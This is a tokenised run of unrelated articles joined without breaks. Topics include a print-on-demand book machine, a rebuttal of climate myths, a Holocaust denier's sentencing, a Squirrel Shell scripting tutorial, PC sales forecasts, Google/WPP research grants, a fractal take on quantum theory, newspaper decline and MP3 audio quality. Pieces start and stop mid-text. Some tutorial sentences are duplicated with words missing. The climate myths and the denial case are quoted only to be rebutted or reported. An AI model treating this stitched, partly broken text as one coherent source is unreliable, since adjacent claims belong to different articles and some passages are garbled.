The quality of the paperback was beyond dispute : the text clear , unsmudged and justified , the paper thick , the jacket smart , if initially a little tacky to the touch .
Described as an " ATM for books " by its US proprietor On Demand Books , Espresso machines have already been established in the US , Canada and Australia , and in the Bibliotheca Alexandrina in Egypt , but the Charing Cross Road machine is the first to be set up in a UK bookstore .
It cost Blackwell some $ 175,000 , but the bookseller believes it will make this back in a year .
" I do think this is going to change the book business , " said Phill Jamieson , Blackwell head of marketing .
" It has the potential to be the biggest change since Gutenberg and we certainly hope it will be .
And it 's not just for us – it gives the ability to small independent bookshops to compete with anybody . "
George Will 's latest column in the Washington Post affords us a fascinating insight into how certain climate change myths pass through the media unchallenged
Does anyone have a hope of beating John Tomlinson 's fantastic record ?
Can the other climate change deniers catch up and snatch the beautiful Christopher Booker prize from him before the competition closes on 31 December ?
Not on current form .
I do n't mean to do them down .
They 're doing their best , as today 's nomination shows , but Tomlinson has set a remarkably high bar .
I have put George Will forward not because his latest column on climate change has a hope of winning this prestigious award , but because it affords us a fascinating insight into how certain myths pass through the media unchallenged .
All these howlers are examples of stories that , for climate change deniers , are too good to check .
They come up again and again on websites and in newspapers , which accept them without examination .
Perhaps because George
Will is one of the paper 's star columnists , they have now found their way into the Washington Post , which prides itself on fact - checking .
Claim one :
" In the 1970s , a major cooling of the planet " was " widely considered inevitable " … " the world 's climatologists are agreed " that we must " prepare for the next ice age "
Fact :
A recent paper ( pdf ) in the Bulletin of the American Meteorological Society shows that "
... despite active efforts to answer these questions , the following pervasive myth arose : there was a consensus among climate scientists of the 1970s that either global cooling or a full - fledged ice age was imminent ...
A review of the climate science literature from 1965 to 1979 shows this myth to be false .
The myth 's basis lies in a selective misreading of the texts both by some members of the media at the time and by some observers today .
In fact , emphasis on greenhouse warming dominated the scientific literature even then .
Interestingly , this paper cites two of George Will 's earlier columns as perpetuating the myth .
He seems to have ignored the journal 's attempt to put him right .
But what does the American Meteorological Society know ?
Claim two :
Since September , however , the increase in sea ice has been the fastest change , either up or down , since 1979 , when satellite record - keeping began .
Fact :
I can find no evidence of this .
The published evidence suggests that the increase in Arctic sea ice this year has been significantly lower than the average since 1979 , and follows a very similar trajectory to that of 2006 - 07 .
Claim three :
According to the University of Illinois ' Arctic Climate Research Center , global sea ice levels now equal those of 1979 .
Fact :
When I contacted to the Arctic Climate Research Center to ask if this claim was correct , the Center 's Bill Chapman wrote this :
No , it is not correct .
I do n't know where they are getting that .
As of today , there are 1.43 m km sq less Arctic sea ice than this same date in 1979 .
( Roughly the size of two Texas - sized states ) .
You might remember that John Tomlinson made the same claim .
So where and how did this myth originate ?
All clues gratefully received .
Claim four :
According to the UN World Meteorological Organization [ WMO ] , there has been no recorded global warming for more than a decade .
Fact :
The most recent WMO statement ( pdf ) shows a continuing warming trend over the past decade , and reports that " the linear warming trend over the past 50 years ( 0.13C per decade ) is nearly twice that for the past 100 years . "
Credit where it 's due :
Will 's article did n't contain many facts , and he managed to get most of them wrong .
Sadly , there was just too much padding .
To compete with Mr Tomlinson , he will either have to write much longer articles , or pack more into his columns .
He knows what he has to do : will he now rise to the challenge ?

BBC News reports that 67 - year - old Ernst Zuendel , has been sentenced to 5 years in prison for violating Germany ’s law against denying the Holocaust .
Actually , he had been convicted on 14 counts of — as the BBC put it — “ inciting racial hatred ” and “ denying that the Nazis killed six million Jews during World War II . ”
Interestingly , Mr. Zuendel had spent much of his adult life in Canada — having lived and worked there since 1958 , and where he wrote a little book called “ The Hitler We Loved and Why . ”
But the Canadians decided he was a security threat in 2005 and sent him back to Germany .
His troubles stemming from laws against denying the Holocaust began shortly thereafter .
From the BBC :
During his trial in the western German city of Mannheim , he was accused of using “ pseudo - scientific ” methods to try to rewrite the accepted history of the Nazi Holocaust in 14 pieces of written work and Internet publications .
Zuendel had denied the charges , asserting his right to free speech , and questioned the constitutionality of the laws being used against him .
Mr. Zuendel ’s sentence comes just two months after another Holocaust denier , the British author David Irving , was released on appeal after spending more than a year in an Austrian prison .
He was convicted on charges of denying the Holocaust in February , 2006 , and was sentenced to a three years in jail , but he appealed for a reduced sentence .
In December , a Vienna court changed Mr. Irving ’s sentence to probation .
Germany is hoping to make denying the Holocaust a crime across the whole of the European Union .
But some critics have argued that the spread of anti-Nazi speech laws in Europe risks going too far .
From Gerard Alexander , writing for the conservative American Enterprise Institute :
Of course , all governments restrict some speech .
But free expression is so foundational to democracy that there is usually a strong bias against restricting speech unless it poses a compelling and even imminent danger to others .
The most pervasive and durable restrictions meet that test , applying to things like child pornography , false statements that result in demonstrable harm ( defamation ) , the exposure of national security information , commercial fraud , and the proverbial shouting of “ Fire ! ” in a crowded theater .
In addition , European countries have never had America ’s strong free - speech tradition .
Nevertheless , three disturbing trends now underway in Europe together represent the greatest erosion of democratic practice in the world ’s advanced democracies since 1945 .
First , anti-Nazi laws are being adopted in places where neo -Nazism poses no serious threat .
Second , speech laws have been dramatically expanded to sanction speech that “ incites hatred ” against groups based on their religion , race , ethnicity , or several other characteristics .
Third , these incitement laws are being interpreted so loosely that they chill not just extremist views but mainstream ones too .
The result is a serious distortion and impoverishment of political debate .
According to the BBC , Berlin would also like the European Union to adopt its own practice of banning Nazi symbols like the swastika .

In 1799 , a French Army engineer made a remarkable find .
No , it was n't foie gras , camembert , pasteurization , or Sartre — in fact , it was the Rosetta stone , the key to deciphering much of Egypt 's ancient hieroglyphics ( see Figure 1 ) .
Figure 1 . The Rosetta stone , an 1100 - pound , trilingual tax policy .
The inscription is a proclamation relaxing taxes on the priesthood .
( Credit Hans Hillewaert 2007 )
The stone , created in 196 BCE , inscribes three translations of a single passage — one each in hieroglyphics , Demotic ( an Egyptian script ) , and classical Greek .
Through comparative translation , or mapping phrases from one translation to another , the Rosetta stone revealed the meaning of many once - undecipherable glyphs .
In other words , think of the Rosetta stone as a half - ton Babelfish .
Even in 196 BCE , there was more than one way to say something .
Software developers face a similar problem some 2000 years later .
There are many ways to say the same thing in so many programming languages .
Even at the command line , there are many analogs to choose from , including a variety of shells and various combinations of commands .
In general , the variety is good , but it can also be daunting .
Which solution do you choose ?
Will the technology keep pace with requirements ?
Will the investment of time and effort pay off ?
Or will those neatly written glyphs ( or are those Perl sigils ? ) become obsolete ?
Worse , will everything have to be translated ( rewritten ) for other environments ?
If you do n't want to commit to the idiosyncrasies of the Fish shell , the Bash shell , the Z shell , the Windows operating system 's cmd.exe , or some other shell scripting language , try the Squirrel Shell .
The Squirrel Shell provides an advanced , object - oriented scripting language that works equally well in UNIX , Linux , Mac OS X , and Windows systems .
You can write a script once and run it anywhere .
Even better , you do n't have to put a half - ton rock in your ear to use it .
Catching the Squirrel
The Squirrel Shell is readily available and free to use per the terms of the GNU Public License version 3 ( GPLv3 ) .
The latest release is 1.2.2 , dated 11 October 2008 .
The founder and maintainer of Squirrel Shell is Constantin " Dinosaur " Makshin .
The Squirrel Shell 's download page ( see Related topics for a link ) provides source code and binaries for 32 - and 64 - bit Windows .
If you use a flavor of UNIX or Linux , check your distribution 's repository for suitable binaries , or build Squirrel Shell from scratch .
A build from scratch is straightforward .
Download and extract the source tarball , change to the source directory , and incant the fairly typical build spell shown in Listing 1 .
Listing 1 . Build the Squirrel Shell from source
$ ./ configure -- with - pcre=system && make && sudo make install Checking CPU architecture ... x86 Checking for install ...
/usr/bin/install ... Configuration has been completed successfully .
Build for x86 CPU architecture Installation prefix : /usr / local Allow debugging : no Build static libraries Use system PCRE 6.7 library Install MIME information : auto Create symbolic link : no Compile C code with ' gcc ' Compile C++ code with ' g ++'
Create static libraries with ' ar rc ' Create executables and shared libraries with ' g ++'
Install files with ' install '
To find the list of package - specific options for configure , type ./ configure -- help at the command line .
For convenience , Squirrel Shell bundles the source code of the Perl Compatible Regular Expression ( PCRE ) library , which is used extensively in the program .
If your system lacks PCRE , the bundled code makes the build quick and easy .
However , if your system already has PCRE , you can choose to use it by specifying the -- with - pcre=system option .
Otherwise , specify -- with - pcre=auto to link with the newer of either the system library or Squirrel Shell 's copy .
The result of the build is a new binary , aptly named squirrelsh .
Assuming that the binary was installed in a directory in your PATH variable , such as /usr / local / bin , type squirrelsh to launch the shell .
At the command prompt , type the command printl ( getenv ( " HOME " ) ) ; to print the path of your home directory :
$ squirrelsh > printl ( getenv( " HOME " ) ) ; /home / strike > exit ( ) ;
The Squirrel Shell is based on the Squirrel programming language ( see Related topics for a link to more information ) .
The language is C++ like and offers features more akin to object - oriented scripting languages such as Python and Ruby .
The Squirrel Shell incorporates all the features and data types found in Squirrel and adds a host of new functions written specifically for common shell scripting tasks , such as copying a file and reading an environment variable .
Although the syntax of Squirrel Shell is too verbose for everyday , command - line use — echo $ HOME is the Bash equivalent of Squirrel Shell 's printl ( " ~ " ) — it shines in scripts .
You write once , run everywhere , not write once in UNIX and again for Windows .
As Dinosaur says of his work , " Squirrel Shell is primarily a script interpreter . "
Scripting with Squirrel
Let 's look at an example Squirrel Shell script .
Listing 2 shows the file listing2.nut , a script to recursively list the contents of your home directory .
Listing 2 . listing2.nut
#!/usr/bin/env squirrelsh function reveal ( filedir ) { if ( ! exist ( filedir ) ) { return ; } if ( filename ( filedir ) == " .. " || filename ( filedir ) == " . " ) { return ; } if ( filetype ( filedir ) == FILE ) { printl ( filename ( filedir , true ) ) ; return ; } printl ( " directory : " + filename ( filedir , true ) ) ; local names = readdir ( filedir ) ; foreach ( index , name in names ) { reveal ( name ) ; } } local previous = getcwd ( ) ; chdir ( " ~ " ) ; reveal ( getcwd ( ) ) ; chdir ( previous ) ; exit( 0 ) ;
Per convention , the first line of every shell script tells the operating system what program to launch to interpret the script .
Typically , you see #!
/usr/bin/bash or #! / bin/zsh on that line to launch a specific shell or interpreter from a specific location .
A#!/usr / bin/env squirrelsh is a bit different .
It launches a special program , env , that in turn launches the first instance of squirrelsh found in your PATH variable .
Hence , you can change your PATH variable to favor a local version of some program — say your own , modified copy of squirrelsh in $ HOME / bin / squirrelsh — and not change the content of the shell script .
Note :
This trick works with all kinds of interpreters .
For instance , #!/usr / bin/env ruby would invoke your preferred version of Ruby , as dictated by your PATH setting .
In general , if you plan to distribute any shell script you write , use the #!/usr / bin/env application form in the first line , as it's more " portable " :
It runs the version of the application the user has configured in his or her PATH variable .
The rest of Listing 2 should seem familiar , at least in approach .
The function reveal ( ) is recursive :
If you pass reveal ( ) an invalid path or the perennial " dot " ( . , the present directory ) or " dot dot " ( .. , the parent directory ) , the recursion ends .
an invalid path or the perennial " dot " ( , the present directory ) or " dot dot " ( , the parent directory ) , the recursion ends .
Otherwise , if the argument , filedir , is a file , the code prints its name and returns , again halting further recursion .
The function filename ( ) can make one argument or two .
With one argument or if the second argument is false , the extension of the file name is omitted .
If you provide true as the second argument , the entire file name is returned .
, is a file , the code prints its name and returns , again halting further recursion .
The function can make one argument or two .
With one argument or if the second argument is , the extension of the file name is omitted .
If you provide as the second argument , the entire file name is returned .
If the argument is a directory , the code prints its name , then scans its contents .
( The processing is not necessarily depth - first , because the contents of the directory are not ordered in a special sequence .
The next example improves the output . )
One item of interest : Because the call to reveal ( ) is the last statement in that very same function , the Squirrel virtual machine ( VM ) — the engine running the script code — can permute the recursion into iteration through a technique called tail recursion .
Essentially , tail recursion eliminates the use of the call stack for recursion ; thus , arbitrarily deep recursion is possible and avoids stack overflow .
The syntax of Squirrel is pretty sparse , so writing code in the language comes quickly , especially if you have written code in C , C++ , or any higher - level language .
Best of all , this shell code is portable .
Transfer it to a Windows machine , install Squirrel Shell for Windows , and run your code .
Tinkering with tables
One of the nice features of Squirrel is its rich set of data structures relative to typical shells .
Complex problems can often be solved quickly if data can simply be organized well .
Squirrel has true objects , heterogeneous arrays , and associative arrays ( or tables , in Squirrel speak ) .
A Squirrel table is composed of slots , or ( key- value ) pairs .
Any value except Null can serve as a key ; any value can be assigned to a slot .
You create a new slot with the " arrow " operator ( <- ) .
Let 's improve the code in Listing 2 to show the contents of a directory before descending further into any subdirectories .
The approach ?
Use a local table to accumulate files and subdirectories in separate slots , then process both categories accordingly .
Listing 3 shows the new version of the code .
Listing 3 .
An enhanced version of Listing 2 to print a directory 's contents first , then recurse into subdirectories
#!/usr/bin/env squirrelsh function reveal ( filedir ) { local tally = {} ; tally [ FILE ] <- [ ] ; tally [ DIR ] <- [ ] ; if ( ! exist ( filedir ) ) { return ; } if ( filename ( filedir ) == " .. " || filename ( filedir ) == " . " ) { return ; } local names = readdir ( filedir ) ; foreach ( index , name in names ) { tally [ filetype ( name ) ] .append ( name ) ; } foreach ( index , file in tally [ FILE ] ) { printl ( file ) ; } foreach ( index , dir in tally [ DIR ] ) { printl ( filename ( dir ) + " / " ) ; } foreach ( index , dir in tally [ DIR ] ) { reveal ( dir ) ; } } local entries = readdir ( ( __argc >= 2 ) ? __argv [ 1 ] : " . " ) ; exit( 0 ) ;
A table is an ideal data structure to use here .
The table in reveal ( ) has two slots : one for files and one for directories .
The return value of the function filetype ( name ) — either the constant FILE or the constant DIR — collates each item in the file system into its appropriate slot .
Further , each slot is an array , created by the two statements tally [ FILE ] <- [ ] and tally [ DIR ] <- [ ] ; . ( [ ] is an empty array . )
Because tally is a local variable within the function , it is created anew with each call and falls out of scope and is destroyed automatically when each call returns .
The array function append ( arg ) adds arg to the end of the array , thus accumulating a list in the process .
After the loop foreach ( index , name in names ) , every item has been put in one slot 's list or the other .
The rest of the code found in the function prints the files , then the directories , then recurses .
Of course , a shell script would be somewhat worthless without command - line arguments .
The special Squirrel Shell variables __argc and __argv contain the count of command - line arguments and the list of arguments as an array of strings , respectively .
Again , per convention , __argv[ 0 ] is always the name of the shell script ; hence , if __argc is at least 2 , then additional arguments were provided .
For brevity , this script processes only the first extra argument , arg v [ 1 ] .
For reference , Listing 4 shows a Ruby script ( written by Mr. Makshin ) that is functionally identical to Listing 3 .
As terse as Ruby can be , it still is n't as succinct as the Squirrel Shell code .
Listing 4 . A reimplementation of Listing 3 in Ruby
!/usr/bin/ruby #
List directory contents .
path = ARGV [ 0 ] == nil ? " . " : ARGV [ 0 ] .dup # Remove trailing slashes while path =~ /\/$/ path.chop !
end entries = Dir.open ( path ) for entry in entries unless entry == " . " || entry == " .. " filePath = " # {path}/#{entry} " file Stat = File.stat( filePath ) if fileStat.directory ?
puts " dir : # {filePath} " elsif fileStat.file ?
puts " file : # {filePath} " end end end entries.
close ( )
For more information about the Squirrel language , see the Squirrel Programming Language Reference ( see Related topics for a link ) .
Smartly , virtually all of the functions in the Squirrel Shell abstract away the specifics of the underlying operating system , so your code can be as generic as possible .
For example , the filename ( ) function ( used in the first two listings above ) strips the leading path from the file path name — reducing / home / example / some / directory / file.txt to file .
txt , for example — no matter what platform your are on .
Similarly , readdir ( ) and filetype ( ) allow you to remain blissfully ignorant of the machinations and trappings of the real , underlying operating and file systems .
Typically , a regular shell does not offer such abstractions .
( The more advanced scripting languages do . )
Other helpful , platform - independent functions include convpath ( ) to convert a path name to the native path name format and run ( ) to invoke another executable .
The convpath ( ) function is bidirectional and very helpful when writing cross-platform scripts .
Mostly regular expressions
Shell scripts are used commonly to automate systems administration and maintenance work .
The power behind much of this automation is the regular expression , a veritable set of hieroglyphics to find , match , and decompose strings .
As mentioned at the outset , Squirrel Shell requires the PCRE library , which is also found in Perl , PHP , Ruby , and many other interpreters and programs .
PCRE is the Samurai sword of data slicers and dicers .
Although complete , the Squirrel Shell 's implementation of regular expressions is a bit different and may remind you of PHP 's implementation .
To use a regular expression in Squirrel Shell , you define the regular expression , compile it , make a comparison , then iterate over the results , if any .
Listing 5 shows a sample program that demonstrates regular expressions in Squirrel Shell ( the code was written by Mr. Makshin and is used with permission ) .
Listing 5 . A demonstration of regular expressions in Squirrel Shell
#!/usr/bin/env squirrelsh //
Match a regular expression against text print ( " Text : " ) ; local text = scan ( ) ; print ( " Pattern : " ) ; local pattern = scan ( ) ; local re = regcompile ( pattern ) ; if ( ! re ) { printl ( " Failed to compile regular expression - " + regerror ( ) ) ; exit ( 1 ) ; } local matches = regmatch ( re , text ) ; if ( ! matches ) { printl ( " Failed to match regular expression - " + regerror ( ) ) ; regfree ( re ) ; exit ( 1 ) ; } regfree ( re ) ; printl ( " Matches found : " ) ; foreach ( match in matches ) printl ( " \t\ " " + substr ( text , match [ 0 ] , match [ 1 ] ) + " \ " " ) ;
Here , scan ( ) reads some text and a pattern from standard input , albeit without the leading and trailing slash ( / ) characters that typically delimit the start and end of a regular expression .
Given a pattern , the function reqgcompile ( ) compiles the pattern , which speeds repeated matches .
You can enable or disable case sensitivity with a flag to the reqgcompile ( ) function ( equivalent to the PCRE / i modifier ) , and you can match against one line or many with another option ( an equivalent for the PCRE /m option ) .
If you do not compile the regular expression , all matches fail .
The regmatch ( re , text ) function compares the regular expression to the text , yielding either Null for no matches or an array of pairs of integers ( a two - element array ) .
The first integer in any pair is the start of the match ; the second integer is the end of the match .
This explains the use of substr ( text , match [ 0 ] , match [ 1 ] ) in the last line of code .
After you perform the comparison , you can iterate over the results .
If at any time you no longer need the compiled regular expression , dispose of it with regfree ( ) .
There is also a regfreeall ( ) function that disposes of all resources held by all compiled expressions .
Nuts for the Squirrel Shell
In a perfect world , the same programming logic would apply to UNIX , Linux , and Windows , and programmers would be happier if not more productive .
Alas , operating systems differ , and there are times when you have to resort to custom code for a specific system .
In those cases where neither Squirrel Shell nor you can abstract the platform away , Squirrel Shell provides a handy function to probe the operating system so code can follow an appropriate branch .
Listing 6 shows how to use the platform ( ) function to make decisions .
This function always a returns a value , although it could be the value unknown .
Listing 6 . The platform ( ) function yields the type of operating system
print ( " Made by ... " ) ; local platform = platform ( ) ; switch ( platform ) { case " linux " : printl( " Linus . " ) ; break ; case " macintosh " : printl( " Steve . " ) ; break ; case " win32 " : case " win64 " : printl( " Bill . " ) ; break ; default : printl( " Unknown " ) ; }
You can also find the type of the current platform through the Squirrel Shell environment variable PLATFORM :
> printl( PLATFORM ) ; linux
The environment variable CPU_ARCH yields the processor for which the shell was compiled :
> printl( CPU_ARCH ) ; x86
Ah , nuts !
The remainder of the Squirrel Shell functions manage files , manipulate the environment , and perform mathematics .
Indeed , there are nearly 20 built - in functions for trigonometry .
Version 2.0 is being planned now and will include more classes , support for Unicode , an improved interactive mode , and a modular , plug - in architecture .
Squirrel
Shell is n't much of an interactive shell , but that 's okay .
There are many alternatives in that category already .
Squirrel Shell is far better as a script runner .
Its data structures are more capable than a traditional shell , it 's syntax is familiar , and its underlying virtual engine supports everything from enumerated types to threads .
The Squirrel engine is also tiny , at less than 6000 lines of code .
You can even embed all of Squirrel in another application .
Try the Squirrel Shell when you have to write code for two platforms .
Its nuts will help you keep yours .

Less frequent replacement is just one aspect of the projected PC sales slump
The PC industry will see a decline of nearly 12 % in 2009 , analysts predict .
It would be only the second period of negative growth in the industry , after a slump of 3.2 % in 2002 .
The news follows an announcement that the semiconductor industry saw a 35 % drop in sales of computer chips between 2008 and 2009 .
However , analysts say the chip industry will weather the global economic storm better and rebound faster than the rest of the technology sector .
" The outside economic situation that we 've seen deteriorating over the last few quarters is now directly affecting the PC market and we 're going to see growth slump over the next year , " said Ranjit Atwal , principal research analyst at Gartner .
The shift in the health of the market was a sharp one .
European PC sales were at 20 % in the third quarter of 2008 ; the fourth quarter saw a dive to just 4 % .
In 2009 , Gartner predicts , those numbers will plummet into the negative .
They say that the global market will see 257 million PCs sold in 2009 , a downward slide of 11.9 % on 2008 .
The market dive that occurred in 2001 - 2002 , Mr Atwal said , was primarily from the corporate side of the market .
This time , both individuals and businesses are predicted to buy fewer PCs , hanging on to ageing computers for longer as part of general belt - tightening .
" The PC market is much more mature [ as compared to 2002 ] , and the PC is relatively more important to consumers , " Mr Atwal said .
" But nevertheless , it 's still a luxury item , it has n't gone all the way that it 's a necessity .
When things go wrong like this , the chip industry actually goes into full gear
Malcolm Penn
Future Horizons
" That means if your PC slows down , does n't work well , does n't do what you think it should do , you 'll live with it . "
Some facets of the PC industry are clearly on the up - such as mini-laptops and netbooks , which are projected to ship 80 % more units in 2009 than 2008 .
However , with just 8 % of the overall market share they can't make up for the slide of the PC industry as a whole .
Weather storm
The semiconductor industry is also facing negative growth : from the third to fourth quarters of 2008 , the industry slumped by nearly a quarter .
Computer chip makers may be better off than computer makers
However , the industry was already scaling back and through " purely good luck " may have not have been caught off - guard as badly as other industries , said Malcolm Penn , chief executive of semiconductor industry analysts Future Horizons .
The industry as a whole had been aiming to cut back on production , driving demand and making the industry more profitable when times were good .
" The only way you can do that is by controlling capacity ; they had been investing more and more in capacity and getting less and less back for it , " said Mr Penn .
" The chip industry has a very different cost structure ; low marginal cost and very high fixed cost , so trimming back is actually quite hard .
As long as you have a little bit of positive cash flow you can keep going . "
With the timely arrival of a recession , the innovation cycle of semiconductor firms actually speeds up , he said .
" When things go wrong like this , the chip industry actually goes into full gear , doing what it does best - which is inventing itself out of the problem , " said Mr Penn .
" This is a good time to restructure , to do the things that you never bother to do when things are humming along . "
That means the next - generation of chips will come sooner , even if the market is such that demand for them only slowly creeps up .

On Wednesday , Google and WPP , a marketing and advertising firm , announced the award of the first round of funding in a planned series of grants to the academic world .
The grants , which will total $ 4.6 million dollars over three years , will be used to fund a variety of projects in areas such as economics , consumer behavior , and statistical analysis , but they all have one thing in common : a focus on online advertising .
Grant recipients get to pursue their studies using internal data provided by both Google and WPP , but it 's not clear whether the use of proprietary data is compatible with the companies ' desire to see the results published in academic journals .
The awards fall under the umbrella of Google Research .
Applications were due at the end of last year , and reviewed by three people with academic backgrounds : Glen Urban , the former dean of MIT 's Sloan School of Management , Hal Varian of Berkeley , who also acts as Google 's Chief Economist , and John Quelch , who 's at Harvard Business School while also acting as a director at WPP .
There is certainly no obvious reason to think that this panel would be anything other than academically rigorous when evaluating the grants .
Their own schools , along with places like NYU and the USC are represented among the recipients , suggesting that the grants attracted applications from professors at a diverse range of top business schools .
What is somewhat amusing about the grants is that this appears to be very much a case of " what Google wants , Google gets . "
On the page that announces the program , the company lists a variety of " topics of interest " that applicants could consider , describing them as " examples of issues where research would be useful . "
Some of the applicants seem to have been successful by deciding that , if something is useful to Google , it 's probably a good idea .
So , for example , one topic of interest was " Is online media more effective for long tail products rather than main stream brands ? "
A trio of professors at MIT and the University of Toronto will now be funded to examine the question " Does internet advertising help established brands or niche ( ' long tail ' ) brands more ? "
Google was also interested in the allocation of advertising dollars between online and offline outlets , asking , " What are the appropriate metrics for comparing and contrasting online and offline media performance ? "
A collaboration between Harvard and USC researchers will help them find out , through a study labeled " Optimal Allocation of Offline and Online Media Budget . "
At this rate , Google will only need a few more rounds of funding to have all of its areas of interest covered .
The grants themselves are in the $ 50,000 - 70,000 range , so these are unlikely to make or break a career .
What may be a more significant lure is the chance to work with large datasets from various marketing studies , largely provided by WPP .
These include brand - tracking data and information on the use of consumer goods , and one monster aggregate that includes information from 6.2 million people , encompassing surveys that span the better part of a decade .
These datasets will undoubtedly provide the researchers access to information that would otherwise be very difficult or expensive to obtain .
Bu the researchers might no be so anxious to use the data for the purposes that Google and WPP would like to see .
The grant announcement plainly states that Google and WPP expect that researchers will treat work funded by this award in the same way that they treat any other academic work : " award recipients will be invited to participate in a meeting highlighting work in this area and will be encouraged to make their results available online and in professional publications . "
Unfortunately , the announcement also makes it clear that the datasets are proprietary .
We contacted WPP and asked for a clarification about what , precisely , the researchers will be able to do if they use this data for a publication ; a spokesman replied , " The research will be public .
The data will not . "
In the world of academic research , this is a serious problem .
Ethics dictate that other researchers should be able to replicate and extend any published studies , and many journals , as a condition of publication , demand that researchers make any materials used in the course of the studies available to anyone who asks for it .
These researchers may face a limited range of options when it comes to publishing work that uses these datasets , and nobody will apparently be able to verify their work .
It 's probably possible to perform some of this research without the proprietary data , and $ 70,000 can buy several years worth of grad students in many locations .
Still , it 's hard to shake the sense that these grants wo n't be all that they could be .
Fractals like this one exhibited by the Romanesco cauliflower could help explain the wackiness of quantum theory ( Image : fishmonk / stock.xchng )
QUANTUM theory just seems too weird to believe .
Particles can be in more than one place at a time .
They do n’t exist until you measure them .
Spookier still , they can even stay in touch when they are separated by great distances .
Einstein thought this was all a bit much , believing it to be evidence of major problems with the theory , as many critics still suspect today .
Quantum enthusiasts point to the theory ’s extraordinary success in explaining the behaviour of atoms , electrons and other quantum systems .
They insist we have to accept the theory as it is , however strange it may seem .
But what if there were a way to reconcile these two opposing views , by showing how quantum theory might emerge from a deeper level of non-weird physics ?
If you listen to physicist Tim Palmer , it begins to sound plausible .
What has been missing , he argues , are some key ideas from an area of science that most quantum physicists have ignored : the science of fractals , those intricate patterns found in everything from fractured surfaces to oceanic flows ( see What is a fractal ? ) .
Take the mathematics of fractals into account , says Palmer , and the long - standing puzzles of quantum theory may be much easier to understand .
They might even dissolve away .
It is an argument that is drawing attention from physicists around the world .
“ His approach is very interesting and refreshingly different , ” says physicist Robert Spekkens of the Perimeter Institute for Theoretical Physics in Waterloo , Canada .
“ He ’s not just trying to reinterpret the usual quantum …

Last Rites
Last week was a sad week to be in the Newsvine offices .
While we were toiling away , our friends upstairs at the Seattle Post - Intelligencer received their unemployment orientation in advance of being laid off two weeks from now .
The conference room in which these talks occurred is right next to Newsvine headquarters , so during the course of entering and leaving the office throughout the week , I caught multiple glances of the scene and the people affected by it .
People losing their jobs is always a sad thing but I feel like this is the true beginning of the end for almost everyone who works at a newspaper .
If you work at one and you are n’t intimately tied to the web operation , you should start making future plans as soon as possible .
And honestly , even if you are intimately tied to the web operation , I would n’t feel too safe either .
The death of the newspaper is a depressing thing to absorb , but what ’s much more disappointing to me is that I feel like news itself has been devalued .
There ’s an oversupply of news - “ ish ” information on the web , and people have decided — usually without realizing it — that free “ news snacking ” is a better value proposition than paying for in - depth reporting .
As one who is surrounded by news snacks everyday in the form of Newsvine , RSS feeds , instant messages , and other inputs , I ’m as guilty as anyone of this mentality .
At the end of the day , I just feel like through my various short - attention - span news inputs , I will absorb most of the news zeitgeist without any cost to me .
Cost is a funny word though .
It is generally used as it was used in the paragraph above : to denote the expending of money .
Lately though , I ’ve noticed there are many non-obvious costs associated with us becoming a society of news snackers :
Our attention spans are shrinking below even the levels caused by the television explosion of the ’ 80s and ’ 90s
We are consuming more and producing less ( no , sharing or reblogging does not count as producing )
We value timeliness of information more than depth of coverage , or even truth in some cases
We are driving most kids completely away from journalism as a profession
We ’re uncovering more of the whos , whats , whens , and wheres , but less of the hows and whys
I suppose we ’re saving some trees and removing some friction from the publishing flow in the process , but all of the above are very bad things ; things that will probably take us awhile to fully realize the effects of .
A lot of people have been asking me lately how the P - I ( and newspapers in general ) could be saved and even whether I ’d like to be a part of it .
In fact , if you want to see a live session about it and you live in Seattle , I ’ll be doing an event at the UW Business School on the subject next month .
I have several modest ideas but none of them involve saving the actual paper .
I ’m a lot more interested in saving the future of long - form and local reporting than I am in saving the newspapers themselves .
Rarely are one ’s ideas completely original so I ’m sure these are no exception , but here are the three most promising in my opinion :
Getting smaller and staying local
Many privately held businesses and all publicly held ones require growth .
It is n’t enough to turn a healthy profit every year .
If your business is n’t growing , your management is questioned and your stock declines .
The first step in keeping local news viable is realizing that it may not be much of a growth business , and it may be quite a bit smaller of a business than it has been in the past .
These two factors do not bode well for the prospects of publicly held local news companies in the future .
Imagine the P - I as something more along the lines of what Cory Bergman has built with his network of neighborhood blogs like My Ballard .
I would argue a fully built - out neighborhood blog network like this is more valuable than what the P - I currently has .
Nothing against the P - I ’s website … it ’s great … but it does n’t pull me in as a citizen of my neighborhood .
It ’s a conventional mix of local stories that usually are n’t that local to me along with national stories I prefer to read on sites like msnbc.com instead .
Local news companies need to concentrate on creating communities of people who talk to each other , not just people who read the news and leave .
Where you can connect people , you can make money .
Make something that ’s worth paying for again
I may not pay for every author I happen to read on a daily basis , but there exists a collection of more than a few people on my blogroll who I would pay $ 5 a month to read , if it were exclusive .
I ’ve always been bearish on paid content as a model , mainly because you could usually do better with advertising , but with CPMs dropping through the floor , I ’m not convinced that is necessarily the case anymore .
What I ’d like to see attempted is positioning a publication as more of a “ discussion club ” .
Heck , maybe you even can read the content for free , but in order to join the discussion , you need to be a paid club member .
With membership also comes social events around town , swanky garb , and other niceties to help you rationalize your modest membership fee .
I always thought the New York Times should have done this with Times Select .
Bear in mind , I ’m not suggesting just throwing up a pay wall .
That would not work .
The idea is creating bits of value — in addition to content — that people would gladly pay several bucks a month for .
Partner with your people
As a great business , your customers should be your best partners .
In the case of news agencies , this does n’t need to stop at readers evangelizing your publication for you .
In many cases , they are actually willing to help you run it .
Why have a staff of 150 when you can have a staff of 15 and engage your community to help produce a lot of the content ?
People like doing things that benefit their community .
Make sure your business is seen as a way to do that .
The future of journalism may be in pro-am publishing .
Anyway …
Overall , I ’m not super optimistic about the future of a lot of these newspaper companies , but I really would love to see them at least replaced with something better .
I still have a hard time believing that a 146 - year - old company like the Seattle P - I is moving out of their own building before we are .
I do n’t see that as any sort of victory for Newsvine since we are much more of a news platform than a news agency , but rather an indication of what happens when you have everything to gain and nothing to lose versus everything to lose and nothing to gain .
Chesky records , a small record label , produces what is called audiophile friendly music .
To learn how to create music with this high detail and how to play it right , just read some of their articles .
There is a lot of talk there on tube amps and stereo mics and horn speakers etc .
Forget the high - end gear , there is one complete article on how to set up your power supply for best audio experience .
But mere mortals like us listen to the music on our PCs .
Though it does not even begin to compare with all that exotic gear out there , it can be set up to deliver a surprisinlgy good quality sound .
This is a highly simplified diagram of how the music flows :
mp3 file –> mp3 decoder –> processor –> soundcard –> speakers –>
Ears
Each one of these stages has to be optimized if you want the best quality sound .
If the mp3 file is low - bit rate to begin with , no amount of tweaking can make it sound lush and full .
Or if you are using tin boxes for speakers , even a SACD would sound crappy on them .
One weak link in the chain and there goes your listening experience .
Input :
MP3 technology was developed by Fraunhoffer Institute in Germany .
They also provide software to encode / decode MP3 files and that is what is used in winamp by default .
But these official decoders are not the best sounding ones .
